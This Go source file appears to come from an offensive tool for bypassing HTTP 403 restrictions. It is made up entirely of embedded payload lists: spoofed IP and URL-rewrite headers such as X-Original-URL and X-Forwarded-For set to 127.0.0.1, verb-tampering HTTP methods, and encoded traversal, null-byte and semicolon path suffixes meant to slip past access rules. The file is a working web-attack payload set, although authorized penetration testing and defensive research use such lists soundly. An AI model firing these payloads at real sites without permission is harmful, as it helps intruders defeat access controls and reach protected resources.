package bypass

// Embedded payloads - no external files needed

// BypassHeaders contains headers commonly used to bypass 403 restrictions
var BypassHeaders = []HeaderPayload{
	{Key: "X-Original-URL", ValueFunc: pathValue},
	{Key: "X-Rewrite-URL", ValueFunc: pathValue},
	{Key: "X-Forwarded-For", Value: "127.0.0.1"},
	{Key: "X-Forwarded-For", Value: "10.0.0.1"},
	{Key: "X-Forwarded-For", Value: "172.16.0.1"},
	{Key: "X-Forwarded-For", Value: "192.168.0.1"},
	{Key: "X-Forwarded-Host", Value: "127.0.0.1"},
	{Key: "X-Forwarded-Host", Value: "localhost"},
	{Key: "X-Host", Value: "127.0.0.1"},
	{Key: "X-Custom-IP-Authorization", Value: "127.0.0.1"},
	{Key: "X-Originating-IP", Value: "127.0.0.1"},
	{Key: "X-Remote-IP", Value: "127.0.0.1"},
	{Key: "X-Client-IP", Value: "127.0.0.1"},
	{Key: "X-Real-IP", Value: "127.0.0.1"},
	{Key: "X-ProxyUser-Ip", Value: "127.0.0.1"},
	{Key: "X-Remote-Addr", Value: "127.0.0.1"},
	{Key: "True-Client-IP", Value: "127.0.0.1"},
	{Key: "Cluster-Client-IP", Value: "127.0.0.1"},
	{Key: "X-Forwarded-Port", Value: "443"},
	{Key: "X-Forwarded-Port", Value: "80"},
	{Key: "X-Forwarded-Port", Value: "8080"},
	{Key: "X-Forwarded-Port", Value: "8443"},
	{Key: "X-Forwarded-Scheme", Value: "https"},
	{Key: "X-Forwarded-Scheme", Value: "http"},
	{Key: "X-Forwarded-Proto", Value: "https"},
	{Key: "X-Forwarded-Proto", Value: "http"},
	{Key: "X-Original-Host", Value: "localhost"},
	{Key: "X-Override-URL", ValueFunc: pathValue},
	{Key: "Forwarded", Value: "for=127.0.0.1;by=127.0.0.1;host=localhost"},
	{Key: "X-Forwarded-Server", Value: "localhost"},
	{Key: "X-HTTP-DestinationURL", ValueFunc: fullURLValue},
	{Key: "X-HTTP-Host-Override", Value: "localhost"},
	{Key: "Proxy-Host", Value: "127.0.0.1"},
	{Key: "Request-Uri", ValueFunc: pathValue},
	{Key: "Referer", ValueFunc: fullURLValue},
	{Key: "X-Proxy-URL", ValueFunc: fullURLValue},
	{Key: "X-Original-Method", Value: "GET"},
	{Key: "Content-Length", Value: "0"},
	{Key: "X-Requested-With", Value: "XMLHttpRequest"},
}

// HTTPMethods contains methods to try for verb tampering
var HTTPMethods = []string{
	"GET", "POST", "PUT", "DELETE", "PATCH",
	"HEAD", "OPTIONS", "TRACE", "CONNECT",
	"PROPFIND", "PROPPATCH", "MKCOL", "COPY",
	"MOVE", "LOCK", "UNLOCK", "VERSION-CONTROL",
	"REPORT", "CHECKOUT", "CHECKIN", "UNCHECKOUT",
	"MKWORKSPACE", "UPDATE", "LABEL", "MERGE",
	"ACL", "ORDERPATCH", "PURGE",
}

// EndPathPayloads contains suffixes to append to paths
var EndPathPayloads = []string{
	"/",
	"//",
	"/./",
	"/..",
	"/..;/",
	"/%2e/",
	"/%2f/",
	"/.%00/",
	"/.%0d/",
	"/.%0a/",
	"/.%00",
	"?",
	"??",
	"#",
	"/*",
	"/.json",
	"/.html",
	"/.php",
	"/.asp",
	"/.aspx",
	"/..%00/",
	"/..%0d/",
	"/..%0a/",
	"/..%09/",
	"/..%ff/",
	"/%20/",
	"/%09/",
	";/",
	".;/",
	"..;/",
	";%09",
	";%09..",
	";%09..;",
	";%2f..",
	"/.randomstring",
}

// MidPathPayloads contains payloads to insert in the middle of paths
var MidPathPayloads = []string{
	"/./",
	"/../",
	"/;/",
	"/.;/",
	"/..;/",
	"/%2e/",
	"/%2f/",
	"/%20/",
	"/%09/",
	"/%00/",
	"/%0d%0a/",
	"/..%00/",
	"/..%0d/",
	"/.%00/",
	"/.%0d/",
	"//",
	"///",
}

// HeaderPayload represents a header-based bypass attempt
type HeaderPayload struct {
	Key       string
	Value     string
	ValueFunc func(targetURL, path string) string
}

// Helper functions for dynamic header values
func pathValue(targetURL, path string) string {
	return path
}

func fullURLValue(targetURL, path string) string {
	return targetURL
}
